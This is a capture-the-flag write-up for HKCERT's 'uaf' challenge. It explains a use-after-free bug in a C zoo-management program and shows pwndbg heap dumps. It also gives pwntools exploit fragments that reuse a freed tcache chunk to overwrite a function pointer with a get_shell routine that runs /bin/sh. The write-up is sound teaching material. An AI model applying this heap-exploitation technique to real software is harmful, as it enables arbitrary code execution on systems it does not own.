# UAF
This is a draft writeup for the challenge - `uaf` from HKCERT 
## Vulnerability 
Here is the vulnerable function from the source code provided:
```c
void remove_animal() {
	int choice;

	if (zoo.numOfAnimal <= 0) {
		print("[ERROR] No animal in the zoo.");
		return;
	}

	print("Zone number? (0-9)");
	while (1) {
		printf("> ");
		scanf("%d", &choice);
		if (choice >= 0 && choice < ZOO_SIZE) {
		    break;
		}
		printf("??\n");
	}

	if (zoo.animals[choice] == NULL) {
		print("[ERROR] No animal in this zone.");
		return;
	}

	free(zoo.animals[choice]->name);
	free(zoo.animals[choice]);

	printf("> [DEBUG] Animal is removed from zone %d\n", choice);

	zoo.numOfAnimal--;
}
```
There's a Use-After-Free (UAF) vulnerability:
```c
	free(zoo.animals[choice]->name);
	free(zoo.animals[choice]);

	printf("> [DEBUG] Animal is removed from zone %d\n", choice);

	zoo.numOfAnimal--;
}
```
because `zoo.animals[choice]->name` and `zoo.animals[choice]` are not set to `NULL` after being freed. They become pointers that points to freed memory.  

Before we dive into exploiting the above vulnerability. Let's first go through some more functions and features of the source code.  

First of all, the goal is obvious that we need to to somehow get here
```c
void get_shell() {
	system("/bin/sh");
}
```
Second, let's just take a look at the critical codes:
```c
// creates a type called speakFunc that represents a function that takes string as parameter and return void 
typedef void (*speakFunc)(char*); 

// *inside the heap region*
struct Animal
{
	// first struct member is a function pointer that points to function that mathces the type
	speakFunc speak; 
	enum AnimalType type;
	
	*inside the heap region*
	char* name;
};

void speak(char* name) {
	print(name);
}
void add_animal() {
	// ......
	animal = (Animal*) malloc(sizeof(Animal));
	
	// ......
		
	animal->speak = speak; // stores the address of speak function to the function pointer 
	
	// ......
	
	animal->name = (char*) malloc(size);
	read(0, animal->name, size);
	
	// ......
	zoo.animals[idx] = animal;
	
	// ......
	
	printf("> [DEBUG] Animal is added to zone %d\n", idx);
	zoo.numOfAnimal++;
}
```
The takeaway from the above is that we have the Animal struct and name buffer stored in heap as some chunks.   

Now let's go through how it looks like in the inside>
Below are examples of chunks formed after creating one single animal:
```
Allocated chunk | PREV_INUSE
Addr: 0x22cc1290
Size: 0x20 (with flag bits: 0x21)

Allocated chunk | PREV_INUSE
Addr: 0x22cc12b0
Size: 0x30 (with flag bits: 0x31)

Top chunk | PREV_INUSE
Addr: 0x22cc12e0
Size: 0x20d20 (with flag bits: 0x20d21)

pwndbg> tele 0x22cc1290 20
00:0000│  0x22cc1290 ◂— 0
01:0008│  0x22cc1298 ◂— 0x21 /* '!' */
02:0010│  0x22cc12a0 —▸ 0x4012cd (speak) ◂— endbr64 
03:0018│  0x22cc12a8 ◂— 0
04:0020│  0x22cc12b0 —▸ 0x22cc12c0 ◂— 0xa41414141 /* 'AAAA\n' */
05:0028│  0x22cc12b8 ◂— 0x31 /* '1' */
06:0030│  0x22cc12c0 ◂— 0xa41414141 /* 'AAAA\n' */
07:0038│  0x22cc12c8 ◂— 0
```
First, we can see some values `0x21` and `0x31`. They are the chunk sizes. 
```
01:0008│  0x22cc1298 ◂— 0x21 /* '!' */
```
For example, `0x21` is calculated by:   
0x18 bytes (requested size) + 0x8 bytes of SIZE_SZ i.e. the address that holds the chunk's size field.   
There's also a masking process that aligns the chunk to ensure a 16-byte alignment. So, the full picture of the chunk size calculation should be: (x + 0x8 + 0xf) & ~0xf, where x is the requested size.  

Next, we have address ending with `0x2a0` storing the function pointer. Which corresponds to `speakFunc speak;` in the animal struct.  
```
02:0010│  0x22cc12a0 —▸ 0x4012cd (speak) ◂— endbr64
```
Therefore, the following:
```
02:0010│  0x22cc12a0 —▸ 0x4012cd (speak) ◂— endbr64
03:0018│  0x22cc12a8 ◂— 0
04:0020│  0x22cc12b0 —▸ 0x22cc12c0 ◂— 0xa41414141 /* 'AAAA\n' */
```
is exactly
```
    speakFunc speak;
    enum AnimalType type;
    char* name;
```
in the animal Struct.  

We could also see 
```
04:0020│  0x22cc12b0 —▸ 0x22cc12c0 ◂— 0xa41414141 /* 'AAAA\n' */
```
where `0x22cc12b0` points to `0x22cc12c0` i.e. the address of the data field of the following chunk, which is the chunk used for `name` buffer allocated right after the chunk for `Animal` Struct
```
05:0028│  0x22cc12b8 ◂— 0x31 /* '1' */
06:0030│  0x22cc12c0 ◂— 0xa41414141 /* 'AAAA\n' */
07:0038│  0x22cc12c8 ◂— 0
```
Now I guess we all have a clear picture of how it looks like in the internal of heap after the allocation.   

But before we dive into talking about the exploit, let's take a quick look at the following function as well:
```c
void report_name() {
    int choice;

    if (zoo.numOfAnimal <= 0) {
        print("[ERROR] No animal in the zoo.");
        return;
    }

    print("Zone number? (0-9)");
    while (1) {
        printf("> ");
        scanf("%d", &choice);
        if (choice >= 0 && choice < ZOO_SIZE) {
            break;
        }
        printf("??\n");
    }

    if (zoo.animals[choice] == NULL) {
        print("[ERROR] No animal in this zone.");
        return;
    }

    zoo.animals[choice]->speak(zoo.animals[choice]->name);
}
```
this is the function that makes use of the function pointer in the `Animal` Struct to call the `speak` function with the animal's name as the parameter. Imagine if we changes the function pointer of `Animal` Struct i.e. `speakFunc speak;` or `0x22cc12a0 —▸ 0x4012cd (speak) ◂— endbr64`, turn it to `get_shell` function entirely, we can then get the shell when `zoo.animals[choice]->speak(zoo.animals[choice]->name);` executes.    

## Exploit
Let's start talking about how we can do it   

What we need to do is to create a condition that allows us to overwrite the function pointer field, i.e. the first field of `Animal` Struct. In order to do that, we can make use of:
```c
	animal->name = (char*) malloc(size);
	read(0, animal->name, size);
```
as it is the only thing we can use to write something into the chunk. But the thing is that we will be writing to the `name` buffer inside an `animal` struct. i.e. If you just do:
```py
add_animal(b"20", p64(sys_addr1))
```
you may see something like this:
```
pwndbg> tele 0x187f6290
00:0000│  0x187f6290 ◂— 0
01:0008│  0x187f6298 ◂— 0x21 /* '!' */
02:0010│  0x187f62a0 —▸ 0x401205 (speak) ◂— push rbp
03:0018│  0x187f62a8 ◂— 0
04:0020│  0x187f62b0 —▸ 0x187f62c0 —▸ 0x4011b6 (get_shell) ◂— push rbp
05:0028│  0x187f62b8 ◂— 0x21 /* '!' */
06:0030│  0x187f62c0 —▸ 0x4011b6 (get_shell) ◂— push rbp
07:0038│  0x187f62c8 ◂— 0xa /* '\n' */
```
And when `zoo.animals[choice]->speak(zoo.animals[choice]->name);` executes, it is not going to execute `get_shell` which is a `name` but not on the function pointer field.  And the thing is that we can write stuff we want to write ONLY on `name` buffer as that's what the program allows us to do.  

Now, the problem has come down to, how can we trick the program to think that the `name` buffer is a `animal` Struct. Here is exactly where `Use-After-Free` shines. What we can do, is to:
1. First create an `animal` struct chunk i.e. in other words just adding a new animal.
2. Free it, it goes into the free list. Now we have 2 chunks freed, one is `animal` struct chunk, the other is `name` buffer chunk.
3. Somehow allocate the chunk that is previously used for the `animal` struct, to be used for new `name` buffer of our latest `animal`
4. Notice that "the chunk that is previously used for the `animal` struct" is would still be valid as an `animal` struct chunk even after being freed and then reallocated as `name` buffer to be written the "name"(get_shell address). Because when it was freed, its pointer were not set to `NULL`, the original `zoo.animals[idx]` pointer is still pointing to this memory location. That is what makes it having double roles:
- Role1: new `name` buffer that we can write things to
- Role2: an `animal` struct that can be "used" (speak) i.e. whose function pointer can be called
So, The vulnerability is about having a pointer to freed memory, which allows interpreting the same chunk in two different ways simultaneously.

With this in mind, let's work on the a detailed attack plan. The hardest part is step 3 of the above:

> 
> 3. Somehow allocate the chunk that is previously used for the `animal` struct, to be used for new `name` buffer of our latest `animal`
> 

In order to somehow allocate a chunk previously used for the entire `animal` struct, to be the a chunk for `name` buffer, we need to first have the `name` buffer chunks with size that is differentiable with the size of the `animal` struct chunks. Just like the following:
```
00:0000│  0x22cc1290 ◂— 0
01:0008│  0x22cc1298 ◂— 0x21 /* '!' */
02:0010│  0x22cc12a0 —▸ 0x4012cd (speak) ◂— endbr64 
03:0018│  0x22cc12a8 ◂— 0
04:0020│  0x22cc12b0 —▸ 0x22cc12c0 ◂— 0xa41414141 /* 'AAAA\n' */
05:0028│  0x22cc12b8 ◂— 0x31 /* '1' */
06:0030│  0x22cc12c0 ◂— 0xa41414141 /* 'AAAA\n' */
07:0038│  0x22cc12c8 ◂— 0
```
one chunk (`animal` struct chunk) being 0x21 bytes and the other (`name` buffer chunk) being 0x31 bytes, so that later we can request for a size that matches the size of the `animal` struct to get it allocated for our new `name` buffer chunk.  

One more notable thing, since the size of `animal` struct chunk is fixed to be 0x21 with flag bits and that `animal` struct chunk allocation is done before we allocate for `name` buffer chunk: 
 
```c
void add_animal() {
	// ......
	animal = (Animal*) malloc(sizeof(Animal));
	// ......
	animal->name = (char*) malloc(size);
	// ......
}
```
What would be done first, is that the `animal` struct chunk would also take a freed chunk from tcachebin which size is also 0x21 bytes. Therefore, we need at least 2 `animal` struct chunk (whose size is 0x21) to be freed first. And of course there would also be 2 more `name` buffer chunk with differentiable size following them in the free list. Here's how it would look like:  
```
Allocated chunk | PREV_INUSE (animal struct chunk)
Addr: 0x3e289290
Size: 0x20 (with flag bits: 0x21)

Allocated chunk | PREV_INUSE (name buffer chunk)
Addr: 0x3e2892b0
Size: 0x30 (with flag bits: 0x31)

Allocated chunk | PREV_INUSE (animal struct chunk)
Addr: 0x3e2892e0
Size: 0x20 (with flag bits: 0x21)

Allocated chunk | PREV_INUSE (name buffer chunk)
Addr: 0x3e289300
Size: 0x30 (with flag bits: 0x31)
```
When freed:
```
tcachebins
0x20 [  2]: 0x3e2892f0 —▸ 0x3e2892a0 ◂— 0 (animal struct chunk)
0x30 [  2]: 0x3e289310 —▸ 0x3e2892c0 ◂— 0 (name buffer chunk)
```
To create the above situation, our python exploit should look like the following:
```py
def add_animal(size, name):
	p.sendlineafter(b"> ", b"1")
	p.sendlineafter(b"> ", b"1")
	p.sendlineafter(b"> ", size)
	p.sendlineafter(b"> ", name)
def remove_animal(number):
	p.sendlineafter(b"> ", b"2")		
	p.sendlineafter(b"> ", number)
	
add_animal(<differentiable size>, "AAAA")
add_animal(<differentiable size>, "AAAA")

remove_animal(b"0") # now goes into tcachebin
remove_animal(b"1") # now goes into tcachebin
```
Now, our target is to add a new `animal` whose `animal` struct chunk allocation would immediately take `0x3e2892f0` away from the tcachebins. Also, we make sure that the size we request for `name` buffer for the new `animal` is less than or equal to 0x20 bytes. So that `0x3e2892a0` which was previously used for `animal` struct chunk would be selected from the tcachebins as well. Just like the following:
```py
add_animal(b"20", p64(sys_addr))
```
we have size 20 ( <= 0x20) for our `name` buffer and `p64(sys_addr)` as the `name`. We would be creating a `name` buffer chunk like the following:
```
01:0008│  0x9570298 ◂— 0x21 /* '!' */
02:0010│  0x95702a0 —▸ 0x401276 (get_shell) ◂— endbr64 
03:0018│  0x95702a8 ◂— 0xa /* '\n' */
```
Still remember that this chunk was previously a chunk used for `animal` struct whose has a pointer from the `zoo.animal[0]` that is not set to `NULL`? Which means if we now `report_name` on `zone 0`, this `name` buffer chunk would be activated as if it is the `animal` struct chunk with `get_shell` at the first struct member field being its function pointer!! In order words, we get the shell if we `report_name` at this particular moment.
